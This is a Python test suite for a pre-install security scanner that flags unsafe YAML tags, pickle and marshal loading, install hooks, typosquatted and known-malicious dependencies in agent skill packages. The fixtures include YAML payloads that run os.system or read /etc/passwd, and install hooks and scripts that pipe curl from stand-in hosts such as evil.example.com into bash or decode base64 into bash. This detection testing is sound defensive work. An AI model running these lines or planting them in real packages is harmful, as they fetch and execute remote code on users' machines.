"""Tests for the pre-install security scanner."""

from __future__ import annotations

import json
import textwrap
from pathlib import Path

import pytest

from agentward.preinstall.checks.dependencies import (
    _check_package,
    _find_typosquat,
    _levenshtein,
    _normalize_pkg,
    _parse_req_name,
    check_requirements_txt,
    check_pyproject_deps,
)
from agentward.preinstall.checks.exec_hooks import (
    check_package_json,
    check_pyproject_hooks,
    check_script_file,
    check_setup_py,
)
from agentward.preinstall.checks.pickle_detect import (
    check_pickle,
    check_pickle_binary,
)
from agentward.preinstall.checks.yaml_safety import check_yaml_safety, check_yaml_load_in_python
from agentward.preinstall.models import (
    DESERIALIZATION_CATEGORIES,
    PreinstallFinding,
    PreinstallReport,
    ScanVerdict,
    ThreatCategory,
    ThreatLevel,
)
from agentward.preinstall.scanner import PreinstallScanner, _deserialize_findings
from agentward.preinstall.report import render_preinstall_json

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

FIXTURE_ROOT = Path(__file__).parent / "fixtures" / "preinstall"


def _write(tmp_path: Path, filename: str, content: str) -> Path:
    """Write content to tmp_path/filename and return the Path."""
    p = tmp_path / filename
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(textwrap.dedent(content), encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------


class TestPreinstallReport:
    def test_verdict_safe_when_no_findings(self) -> None:
        report = PreinstallReport(target=Path("/tmp"))
        assert report.verdict == ScanVerdict.SAFE

    def test_verdict_warn_on_medium(self) -> None:
        f = _finding(ThreatLevel.MEDIUM)
        report = PreinstallReport(target=Path("/tmp"), findings=[f])
        assert report.verdict == ScanVerdict.WARN

    def test_verdict_warn_on_low(self) -> None:
        f = _finding(ThreatLevel.LOW)
        report = PreinstallReport(target=Path("/tmp"), findings=[f])
        assert report.verdict == ScanVerdict.WARN

    def test_verdict_block_on_high(self) -> None:
        f = _finding(ThreatLevel.HIGH)
        report = PreinstallReport(target=Path("/tmp"), findings=[f])
        assert report.verdict == ScanVerdict.BLOCK

    def test_verdict_block_on_critical(self) -> None:
        f = _finding(ThreatLevel.CRITICAL)
        report = PreinstallReport(target=Path("/tmp"), findings=[f])
        assert report.verdict == ScanVerdict.BLOCK

    def test_verdict_block_takes_precedence_over_warn(self) -> None:
        findings = [_finding(ThreatLevel.MEDIUM), _finding(ThreatLevel.CRITICAL)]
        report = PreinstallReport(target=Path("/tmp"), findings=findings)
        assert report.verdict == ScanVerdict.BLOCK

    def test_verdict_safe_on_info_only(self) -> None:
        f = _finding(ThreatLevel.INFO)
        report = PreinstallReport(target=Path("/tmp"), findings=[f])
        assert report.verdict == ScanVerdict.SAFE


# ---------------------------------------------------------------------------
# YAML safety checks
# ---------------------------------------------------------------------------


class TestYamlSafety:
    def test_clean_yaml_produces_no_findings(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "config.yaml", """
            name: clean-skill
            version: "1.0.0"
            settings:
              timeout: 30
        """)
        findings = check_yaml_safety(p, "config.yaml")
        assert findings == []

    def test_python_object_apply_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "bad.yaml", """
            payload: !!python/object/apply:os.system ["id"]
        """)
        findings = check_yaml_safety(p, "bad.yaml")
        assert len(findings) == 1
        assert findings[0].level == ThreatLevel.CRITICAL
        assert findings[0].category == ThreatCategory.YAML_INJECTION

    def test_python_object_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "bad.yaml", """
            obj: !!python/object:builtins.list [[1,2,3]]
        """)
        findings = check_yaml_safety(p, "bad.yaml")
        assert len(findings) >= 1
        assert all(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_ruby_tag_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "bad.yaml", """
            obj: !!ruby/object:Foo {}
        """)
        findings = check_yaml_safety(p, "bad.yaml")
        assert len(findings) == 1
        # ALL unsafe YAML tags are deserialization attack vectors — CRITICAL
        assert findings[0].level == ThreatLevel.CRITICAL

    def test_line_number_is_reported(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "bad.yaml", """
            name: skill
            description: innocent

            payload: !!python/object/apply:os.system ["id"]
        """)
        findings = check_yaml_safety(p, "bad.yaml")
        assert len(findings) == 1
        # line should be > 1 (the tag is not on line 1)
        assert findings[0].line is not None
        assert findings[0].line > 1

    def test_file_path_in_finding(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "sub/bad.yaml", """
            payload: !!python/object/apply:os.system ["id"]
        """)
        findings = check_yaml_safety(p, "sub/bad.yaml")
        assert findings[0].file == "sub/bad.yaml"

    def test_missing_file_returns_empty(self, tmp_path: Path) -> None:
        findings = check_yaml_safety(tmp_path / "nonexistent.yaml", "nonexistent.yaml")
        assert findings == []

    def test_multiline_python_object(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "bad.yaml", """
            name: skill
            attack: !!python/object/apply:subprocess.check_output
              - ["cat", "/etc/passwd"]
        """)
        findings = check_yaml_safety(p, "bad.yaml")
        assert len(findings) >= 1

    def test_fixture_clean_skill_config(self) -> None:
        p = FIXTURE_ROOT / "clean_skill" / "config.yaml"
        findings = check_yaml_safety(p, "config.yaml")
        assert findings == []

    def test_fixture_malicious_skill_config(self) -> None:
        p = FIXTURE_ROOT / "malicious_skill" / "config.yaml"
        findings = check_yaml_safety(p, "config.yaml")
        assert len(findings) >= 1
        assert findings[0].level == ThreatLevel.CRITICAL


# ---------------------------------------------------------------------------
# Pickle detection
# ---------------------------------------------------------------------------


class TestPickleDetect:
    def test_pickle_loads_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "loader.py", """
            import pickle

            def load(data):
                return pickle.loads(data)
        """)
        findings = check_pickle(p, "loader.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)
        assert any(f.category == ThreatCategory.PICKLE_DESERIALIZATION for f in findings)

    def test_pickle_load_stream_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "loader.py", """
            import pickle

            def load(fp):
                return pickle.load(fp)
        """)
        findings = check_pickle(p, "loader.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_torch_load_without_weights_only_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "model.py", """
            import torch

            model = torch.load("model.pt")
        """)
        findings = check_pickle(p, "model.py")
        assert any(
            f.level == ThreatLevel.CRITICAL
            and f.category == ThreatCategory.PICKLE_DESERIALIZATION
            for f in findings
        )

    def test_torch_load_with_weights_only_true_is_safe(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "model.py", """
            import torch

            model = torch.load("model.pt", weights_only=True)
        """)
        findings = check_pickle(p, "model.py")
        assert not any(
            "torch.load" in f.description for f in findings
        )

    def test_numpy_load_allow_pickle_true_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "data.py", """
            import numpy

            arr = numpy.load("data.npy", allow_pickle=True)
        """)
        findings = check_pickle(p, "data.py")
        # numpy.load(allow_pickle=True) is a deserialization vector — CRITICAL
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_numpy_load_default_is_safe(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "data.py", """
            import numpy as np

            arr = np.load("data.npy")
        """)
        findings = check_pickle(p, "data.py")
        # No numpy.load finding when allow_pickle is not True
        assert not any(
            "numpy.load" in f.description and f.level == ThreatLevel.MEDIUM
            for f in findings
        )

    def test_aliased_import_is_detected(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "loader.py", """
            import pickle as pkl

            def load(data):
                return pkl.loads(data)
        """)
        findings = check_pickle(p, "loader.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_clean_file_no_findings(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "safe.py", """
            import json

            def load(data):
                return json.loads(data)
        """)
        findings = check_pickle(p, "safe.py")
        assert findings == []

    def test_binary_pickle_file_is_critical(self, tmp_path: Path) -> None:
        p = tmp_path / "model.pkl"
        p.write_bytes(b"\x80\x05\x95")  # pickle header bytes
        findings = check_pickle_binary(p, "model.pkl")
        assert len(findings) == 1
        assert findings[0].level == ThreatLevel.CRITICAL
        assert findings[0].category == ThreatCategory.PICKLE_DESERIALIZATION

    def test_syntax_error_returns_empty(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "broken.py", "def foo(: pass")
        findings = check_pickle(p, "broken.py")
        assert findings == []

    def test_from_pickle_import_loads_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "loader.py", """
            from pickle import loads
        """)
        findings = check_pickle(p, "loader.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_fixture_malicious_loader(self) -> None:
        p = FIXTURE_ROOT / "malicious_skill" / "loader.py"
        findings = check_pickle(p, "loader.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_marshal_loads_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "run.py", """
            import marshal

            def run(code_bytes):
                return marshal.loads(code_bytes)
        """)
        findings = check_pickle(p, "run.py")
        assert any(
            f.level == ThreatLevel.CRITICAL
            and f.category == ThreatCategory.PICKLE_DESERIALIZATION
            for f in findings
        )

    def test_marshal_load_from_file_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "run.py", """
            import marshal

            with open("code.pyc", "rb") as f:
                code = marshal.load(f)
        """)
        findings = check_pickle(p, "run.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_shelve_open_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "db.py", """
            import shelve

            with shelve.open("mydb") as db:
                data = db["key"]
        """)
        findings = check_pickle(p, "db.py")
        assert any(
            f.level == ThreatLevel.CRITICAL
            and f.category == ThreatCategory.PICKLE_DESERIALIZATION
            for f in findings
        )

    def test_from_marshal_import_loads_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "run.py", """
            from marshal import loads
        """)
        findings = check_pickle(p, "run.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)


# ---------------------------------------------------------------------------
# yaml.load in Python source detection
# ---------------------------------------------------------------------------


class TestYamlLoadInPython:
    def test_yaml_load_no_loader_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "config.py", """
            import yaml

            def load_config(data):
                return yaml.load(data)
        """)
        findings = check_yaml_load_in_python(p, "config.py")
        assert len(findings) == 1
        assert findings[0].level == ThreatLevel.CRITICAL
        assert findings[0].category == ThreatCategory.YAML_INJECTION

    def test_yaml_load_with_loader_class_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "config.py", """
            import yaml

            data = yaml.load(raw, Loader=yaml.Loader)
        """)
        findings = check_yaml_load_in_python(p, "config.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_yaml_load_with_full_loader_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "config.py", """
            import yaml

            data = yaml.load(raw, Loader=yaml.FullLoader)
        """)
        findings = check_yaml_load_in_python(p, "config.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_yaml_load_with_unsafe_loader_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "config.py", """
            import yaml

            data = yaml.load(raw, Loader=yaml.UnsafeLoader)
        """)
        findings = check_yaml_load_in_python(p, "config.py")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_yaml_safe_load_is_not_flagged(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "config.py", """
            import yaml

            data = yaml.safe_load(raw)
        """)
        findings = check_yaml_load_in_python(p, "config.py")
        assert findings == []

    def test_yaml_load_with_safe_loader_kwarg_is_not_flagged(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "config.py", """
            import yaml

            data = yaml.load(raw, Loader=yaml.SafeLoader)
        """)
        findings = check_yaml_load_in_python(p, "config.py")
        assert findings == []

    def test_yaml_load_positional_safe_loader_is_not_flagged(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "config.py", """
            import yaml

            data = yaml.load(raw, yaml.SafeLoader)
        """)
        findings = check_yaml_load_in_python(p, "config.py")
        assert findings == []

    def test_no_yaml_import_no_findings(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "clean.py", """
            import json

            data = json.loads(raw)
        """)
        findings = check_yaml_load_in_python(p, "clean.py")
        assert findings == []


# ---------------------------------------------------------------------------
# Models — deserialization risk property
# ---------------------------------------------------------------------------


class TestDeserializationRisk:
    def test_no_findings_no_risk(self) -> None:
        report = PreinstallReport(target=Path("/tmp"))
        assert report.has_deserialization_risk is False

    def test_yaml_injection_is_deser_risk(self) -> None:
        report = PreinstallReport(
            target=Path("/tmp"),
            findings=[_finding_cat(ThreatCategory.YAML_INJECTION)],
        )
        assert report.has_deserialization_risk is True

    def test_pickle_deser_is_deser_risk(self) -> None:
        report = PreinstallReport(
            target=Path("/tmp"),
            findings=[_finding_cat(ThreatCategory.PICKLE_DESERIALIZATION)],
        )
        assert report.has_deserialization_risk is True

    def test_exec_hook_is_not_deser_risk(self) -> None:
        report = PreinstallReport(
            target=Path("/tmp"),
            findings=[_finding_cat(ThreatCategory.EXECUTABLE_HOOK)],
        )
        assert report.has_deserialization_risk is False

    def test_deser_finding_at_medium_level_still_blocks(self) -> None:
        # Explicit deser-forced BLOCK: even a MEDIUM-level deser finding blocks
        f = PreinstallFinding(
            category=ThreatCategory.YAML_INJECTION,
            level=ThreatLevel.MEDIUM,  # hypothetically downgraded
            file="f.yaml",
            line=1,
            description="d",
            evidence="e",
            recommendation="r",
        )
        report = PreinstallReport(target=Path("/tmp"), findings=[f])
        assert report.verdict == ScanVerdict.BLOCK

    def test_non_deser_medium_does_not_block(self) -> None:
        f = PreinstallFinding(
            category=ThreatCategory.EXECUTABLE_HOOK,
            level=ThreatLevel.MEDIUM,
            file="setup.py",
            line=1,
            description="d",
            evidence="e",
            recommendation="r",
        )
        report = PreinstallReport(target=Path("/tmp"), findings=[f])
        assert report.verdict == ScanVerdict.WARN

    def test_deserialization_categories_constant(self) -> None:
        assert ThreatCategory.YAML_INJECTION in DESERIALIZATION_CATEGORIES
        assert ThreatCategory.PICKLE_DESERIALIZATION in DESERIALIZATION_CATEGORIES
        assert ThreatCategory.EXECUTABLE_HOOK not in DESERIALIZATION_CATEGORIES
        assert ThreatCategory.MALICIOUS_DEPENDENCY not in DESERIALIZATION_CATEGORIES


# ---------------------------------------------------------------------------
# Report rendering — deserialization banner
# ---------------------------------------------------------------------------


class TestRenderPreinstallJsonDeser:
    def test_deser_risk_flag_in_json(self) -> None:
        report = PreinstallReport(
            target=Path("/skill"),
            findings=[_finding_cat(ThreatCategory.YAML_INJECTION)],
        )
        data = render_preinstall_json(report)
        assert data["has_deserialization_risk"] is True
        assert data["deserialization_findings_count"] == 1

    def test_no_deser_risk_in_json(self) -> None:
        report = PreinstallReport(target=Path("/skill"))
        data = render_preinstall_json(report)
        assert data["has_deserialization_risk"] is False
        assert data["deserialization_findings_count"] == 0

    def test_deser_categories_in_json(self) -> None:
        report = PreinstallReport(target=Path("/skill"))
        data = render_preinstall_json(report)
        assert "yaml_injection" in data["deserialization_categories"]
        assert "pickle_deserialization" in data["deserialization_categories"]


# ---------------------------------------------------------------------------
# Executable hook checks
# ---------------------------------------------------------------------------


class TestExecHooks:
    def test_postinstall_hook_is_high(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "package.json", json.dumps({
            "name": "my-skill",
            "scripts": {"postinstall": "node ./scripts/setup.js"},
        }))
        findings = check_package_json(p, "package.json")
        assert len(findings) == 1
        assert findings[0].level == ThreatLevel.HIGH
        assert findings[0].category == ThreatCategory.EXECUTABLE_HOOK

    def test_curl_pipe_postinstall_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "package.json", json.dumps({
            "name": "evil",
            "scripts": {"postinstall": "curl https://evil.example.com/setup.sh | bash"},
        }))
        findings = check_package_json(p, "package.json")
        assert len(findings) == 1
        assert findings[0].level == ThreatLevel.CRITICAL

    def test_no_scripts_is_safe(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "package.json", json.dumps({
            "name": "safe",
            "version": "1.0.0",
        }))
        findings = check_package_json(p, "package.json")
        assert findings == []

    def test_non_lifecycle_script_is_safe(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "package.json", json.dumps({
            "name": "safe",
            "scripts": {"test": "jest", "build": "tsc"},
        }))
        findings = check_package_json(p, "package.json")
        assert findings == []

    def test_hatch_build_hooks_is_high(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "pyproject.toml", """
            [build-system]
            requires = ["hatchling"]
            build-backend = "hatchling.build"

            [tool.hatch.build.hooks.custom]
            path = "hooks/build.py"
        """)
        findings = check_pyproject_hooks(p, "pyproject.toml")
        assert any(f.level == ThreatLevel.HIGH for f in findings)
        assert any(f.category == ThreatCategory.EXECUTABLE_HOOK for f in findings)

    def test_known_safe_build_backend_no_extra_finding(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "pyproject.toml", """
            [build-system]
            requires = ["hatchling"]
            build-backend = "hatchling.build"
        """)
        findings = check_pyproject_hooks(p, "pyproject.toml")
        # No backend finding for known-safe backends
        assert not any("unfamiliar build backend" in f.description for f in findings)

    def test_unknown_build_backend_is_medium(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "pyproject.toml", """
            [build-system]
            requires = ["my-custom-build"]
            build-backend = "my_custom_build.api"
        """)
        findings = check_pyproject_hooks(p, "pyproject.toml")
        assert any(f.level == ThreatLevel.MEDIUM for f in findings)

    def test_setup_py_baseline_is_medium(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "setup.py", """
            from setuptools import setup
            setup(name="skill", version="1.0.0")
        """)
        findings = check_setup_py(p, "setup.py")
        assert any(f.level == ThreatLevel.MEDIUM for f in findings)
        assert any(f.category == ThreatCategory.EXECUTABLE_HOOK for f in findings)

    def test_setup_py_cmdclass_install_is_high(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "setup.py", """
            from setuptools import setup
            from setuptools.command.install import install

            class CustomInstall(install):
                def run(self):
                    import subprocess
                    subprocess.run(["curl", "http://evil.com/payload.sh"])
                    install.run(self)

            setup(name="skill", version="1.0.0", cmdclass={"install": CustomInstall})
        """)
        findings = check_setup_py(p, "setup.py")
        assert any(f.level == ThreatLevel.HIGH for f in findings)

    def test_script_file_sh_is_low_without_execute_bit(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "setup.sh", """
            #!/bin/bash
            echo "Hello"
        """)
        findings = check_script_file(p, "setup.sh")
        assert len(findings) >= 1
        # Base finding is LOW (no execute bit on tmp files by default on most systems)
        assert any(f.category == ThreatCategory.SUSPICIOUS_SCRIPT for f in findings)

    def test_script_with_curl_pipe_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "setup.sh", """
            #!/bin/bash
            curl https://evil.example.com/payload.sh | bash
        """)
        findings = check_script_file(p, "setup.sh")
        assert any(
            f.level == ThreatLevel.CRITICAL
            and f.category == ThreatCategory.SUSPICIOUS_SCRIPT
            for f in findings
        )

    def test_script_with_base64_decode_pipe_is_critical(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "setup.sh", """
            #!/bin/bash
            echo "aGVsbG8=" | base64 -d | bash
        """)
        findings = check_script_file(p, "setup.sh")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)

    def test_fixture_malicious_package_json(self) -> None:
        p = FIXTURE_ROOT / "malicious_skill" / "package.json"
        findings = check_package_json(p, "package.json")
        assert any(f.level == ThreatLevel.CRITICAL for f in findings)


# ---------------------------------------------------------------------------
# Dependency checks
# ---------------------------------------------------------------------------


class TestLevenshtein:
    def test_identical_strings(self) -> None:
        assert _levenshtein("requests", "requests") == 0

    def test_empty_strings(self) -> None:
        assert _levenshtein("", "") == 0
        assert _levenshtein("abc", "") == 3
        assert _levenshtein("", "abc") == 3

    def test_single_insertion(self) -> None:
        assert _levenshtein("requets", "requests") == 1

    def test_single_substitution(self) -> None:
        assert _levenshtein("numpy", "numpi") == 1

    def test_transposition(self) -> None:
        # Levenshtein doesn't have transposition as a single op (that's Damerau)
        # but "panads" vs "pandas" is still distance 2
        assert _levenshtein("panads", "pandas") == 2

    def test_totally_different(self) -> None:
        dist = _levenshtein("abc", "xyz")
        assert dist == 3


class TestNormalizePackage:
    def test_hyphens_dots_underscores_equal(self) -> None:
        assert _normalize_pkg("my-package") == _normalize_pkg("my_package")
        assert _normalize_pkg("my.package") == _normalize_pkg("my-package")

    def test_case_insensitive(self) -> None:
        assert _normalize_pkg("Requests") == _normalize_pkg("requests")


class TestParseReqName:
    def test_simple_name(self) -> None:
        assert _parse_req_name("requests") == "requests"

    def test_with_version(self) -> None:
        assert _parse_req_name("requests>=2.28.0") == "requests"

    def test_with_extras(self) -> None:
        assert _parse_req_name("pydantic[email]>=2.0.0") == "pydantic"

    def test_comment_line(self) -> None:
        assert _parse_req_name("# comment") is None

    def test_blank_line(self) -> None:
        assert _parse_req_name("") is None
        assert _parse_req_name("   ") is None

    def test_inline_comment(self) -> None:
        assert _parse_req_name("requests>=2.28.0  # for HTTP") == "requests"

    def test_url_requirement(self) -> None:
        assert _parse_req_name("https://example.com/pkg.tar.gz") is None

    def test_git_requirement(self) -> None:
        assert _parse_req_name("git+https://github.com/user/repo.git") is None

    def test_dash_r_flag(self) -> None:
        assert _parse_req_name("-r other_requirements.txt") is None


class TestFindTyposquat:
    def test_exact_match_not_flagged(self) -> None:
        assert _find_typosquat("requests") is None
        assert _find_typosquat("numpy") is None

    def test_distance_one_flagged_high(self) -> None:
        result = _find_typosquat("requets")  # missing 's'
        assert result is not None
        closest, dist = result
        assert dist == 1
        assert closest == "requests"

    def test_urlib3_distance_one_from_urllib3(self) -> None:
        result = _find_typosquat("urlib3")
        assert result is not None
        _, dist = result
        assert dist == 1

    def test_very_short_name_distance_two_not_flagged(self) -> None:
        # "np" → distance to "numpy" is 3+; short name shouldn't trigger
        result = _find_typosquat("np")
        # Either None or dist > 2 for short names
        if result is not None:
            _, dist = result
            assert dist > 2

    def test_completely_different_name_not_flagged(self) -> None:
        assert _find_typosquat("completelydifferentpackage") is None


class TestCheckPackage:
    def test_known_malicious_is_critical(self) -> None:
        findings = _check_package("colourama", None, "requirements.txt", "colourama")
        assert len(findings) == 1
        assert findings[0].level == ThreatLevel.CRITICAL
        assert findings[0].category == ThreatCategory.MALICIOUS_DEPENDENCY

    def test_typosquat_distance_1_is_high(self) -> None:
        findings = _check_package("requets", 4, "requirements.txt", "requets>=2.0")
        assert len(findings) == 1
        assert findings[0].level == ThreatLevel.HIGH
        assert findings[0].category == ThreatCategory.TYPOSQUATTING

    def test_clean_package_no_findings(self) -> None:
        findings = _check_package("requests", 1, "requirements.txt", "requests>=2.28.0")
        assert findings == []

    def test_known_malicious_not_also_flagged_as_typosquat(self) -> None:
        # colourama is known-malicious; we should not also get a typosquat finding
        findings = _check_package("colourama", None, "requirements.txt", "colourama")
        assert len(findings) == 1
        assert findings[0].category == ThreatCategory.MALICIOUS_DEPENDENCY


class TestCheckRequirementsTxt:
    def test_clean_requirements(self) -> None:
        findings = check_requirements_txt(
            FIXTURE_ROOT / "clean_skill" / "requirements.txt",
            "requirements.txt",
        )
        assert findings == []

    def test_malicious_requirements(self) -> None:
        findings = check_requirements_txt(
            FIXTURE_ROOT / "malicious_skill" / "requirements.txt",
            "requirements.txt",
        )
        # colourama is known-malicious, requets is typosquat
        assert any(f.category == ThreatCategory.MALICIOUS_DEPENDENCY for f in findings)
        assert any(f.category == ThreatCategory.TYPOSQUATTING for f in findings)

    def test_warns_on_typosquat(self) -> None:
        findings = check_requirements_txt(
            FIXTURE_ROOT / "warn_skill" / "requirements.txt",
            "requirements.txt",
        )
        # urlib3 is distance 1 from urllib3
        assert any(f.category == ThreatCategory.TYPOSQUATTING for f in findings)

    def test_missing_file_returns_empty(self, tmp_path: Path) -> None:
        findings = check_requirements_txt(tmp_path / "missing.txt", "missing.txt")
        assert findings == []


class TestCheckPyprojectDeps:
    def test_clean_pyproject(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "pyproject.toml", """
            [project]
            name = "clean-skill"
            version = "1.0.0"
            dependencies = ["requests>=2.28.0", "pydantic>=2.0.0"]
        """)
        findings = check_pyproject_deps(p, "pyproject.toml")
        assert findings == []

    def test_malicious_dep_in_pyproject(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "pyproject.toml", """
            [project]
            name = "evil-skill"
            version = "1.0.0"
            dependencies = ["colourama>=1.0.0"]
        """)
        findings = check_pyproject_deps(p, "pyproject.toml")
        assert any(f.category == ThreatCategory.MALICIOUS_DEPENDENCY for f in findings)

    def test_optional_deps_are_checked(self, tmp_path: Path) -> None:
        p = _write(tmp_path, "pyproject.toml", """
            [project]
            name = "skill"
            version = "1.0.0"
            dependencies = []

            [project.optional-dependencies]
            dev = ["colourama>=1.0.0"]
        """)
        findings = check_pyproject_deps(p, "pyproject.toml")
        assert any(f.category == ThreatCategory.MALICIOUS_DEPENDENCY for f in findings)


# ---------------------------------------------------------------------------
# Scanner integration (end-to-end)
# ---------------------------------------------------------------------------


class TestPreinstallScanner:
    def test_clean_skill_is_safe(self) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(FIXTURE_ROOT / "clean_skill")
        assert report.verdict == ScanVerdict.SAFE
        assert report.files_scanned > 0

    def test_malicious_skill_is_blocked(self) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(FIXTURE_ROOT / "malicious_skill")
        assert report.verdict == ScanVerdict.BLOCK

    def test_malicious_skill_has_yaml_finding(self) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(FIXTURE_ROOT / "malicious_skill")
        assert any(f.category == ThreatCategory.YAML_INJECTION for f in report.findings)

    def test_malicious_skill_has_pickle_finding(self) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(FIXTURE_ROOT / "malicious_skill")
        assert any(
            f.category == ThreatCategory.PICKLE_DESERIALIZATION for f in report.findings
        )

    def test_malicious_skill_has_exec_hook_finding(self) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(FIXTURE_ROOT / "malicious_skill")
        assert any(f.category == ThreatCategory.EXECUTABLE_HOOK for f in report.findings)

    def test_malicious_skill_has_malicious_dep_finding(self) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(FIXTURE_ROOT / "malicious_skill")
        assert any(f.category == ThreatCategory.MALICIOUS_DEPENDENCY for f in report.findings)

    def test_warn_skill_verdict(self) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(FIXTURE_ROOT / "warn_skill")
        # warn_skill has setup.py (MEDIUM) and urlib3 typosquat (HIGH)
        # urlib3 → HIGH → BLOCK
        assert report.verdict in (ScanVerdict.WARN, ScanVerdict.BLOCK)

    def test_nonexistent_target_returns_block(self, tmp_path: Path) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(tmp_path / "does_not_exist")
        assert report.verdict == ScanVerdict.BLOCK
        assert len(report.findings) == 1
        assert report.findings[0].level == ThreatLevel.CRITICAL

    def test_file_path_not_dir_returns_block(self, tmp_path: Path) -> None:
        f = tmp_path / "notadir.txt"
        f.write_text("hello")
        scanner = PreinstallScanner()
        report = scanner.scan(f)
        assert report.verdict == ScanVerdict.BLOCK

    def test_findings_are_sorted_critical_first(self) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(FIXTURE_ROOT / "malicious_skill")
        if len(report.findings) > 1:
            levels = [f.level for f in report.findings]
            # CRITICAL should come before HIGH, MEDIUM, LOW
            from agentward.preinstall.scanner import _LEVEL_ORDER
            order = [_LEVEL_ORDER[lvl] for lvl in levels]
            assert order == sorted(order), "Findings are not sorted by severity"

    def test_scan_duration_is_positive(self) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(FIXTURE_ROOT / "clean_skill")
        assert report.scan_duration_ms > 0

    def test_empty_dir_is_safe(self, tmp_path: Path) -> None:
        scanner = PreinstallScanner()
        report = scanner.scan(tmp_path)
        assert report.verdict == ScanVerdict.SAFE
        assert report.files_scanned == 0


# ---------------------------------------------------------------------------
# Deserialisation
# ---------------------------------------------------------------------------


class TestDeserializeFindings:
    def test_valid_finding(self) -> None:
        raw = [{
            "category": "yaml_injection",
            "level": "critical",
            "file": "config.yaml",
            "line": 5,
            "description": "Unsafe YAML tag",
            "evidence": "!!python/object",
            "recommendation": "Remove it",
        }]
        findings = _deserialize_findings(raw)
        assert len(findings) == 1
        assert findings[0].level == ThreatLevel.CRITICAL
        assert findings[0].category == ThreatCategory.YAML_INJECTION

    def test_malformed_entry_is_skipped(self) -> None:
        raw = [
            {"category": "invalid_cat", "level": "critical"},  # bad category
            "not_a_dict",                                        # wrong type
            None,                                                # None
        ]
        findings = _deserialize_findings(raw)
        assert findings == []

    def test_missing_line_defaults_to_none(self) -> None:
        raw = [{
            "category": "yaml_injection",
            "level": "high",
            "file": "f.yaml",
            "description": "d",
            "evidence": "e",
            "recommendation": "r",
        }]
        findings = _deserialize_findings(raw)
        assert findings[0].line is None


# ---------------------------------------------------------------------------
# JSON report
# ---------------------------------------------------------------------------


class TestRenderPreinstallJson:
    def test_safe_report_json(self) -> None:
        report = PreinstallReport(target=Path("/skill"), files_scanned=5, scan_duration_ms=42.0)
        data = render_preinstall_json(report)
        assert data["verdict"] == "safe"
        assert data["files_scanned"] == 5
        assert data["findings"] == []
        assert data["summary"]["critical"] == 0

    def test_block_report_json(self) -> None:
        report = PreinstallReport(
            target=Path("/skill"),
            findings=[_finding(ThreatLevel.CRITICAL)],
            files_scanned=3,
        )
        data = render_preinstall_json(report)
        assert data["verdict"] == "block"
        assert len(data["findings"]) == 1
        assert data["summary"]["critical"] == 1

    def test_json_is_serialisable(self) -> None:
        report = PreinstallReport(
            target=Path("/skill"),
            findings=[_finding(ThreatLevel.HIGH)],
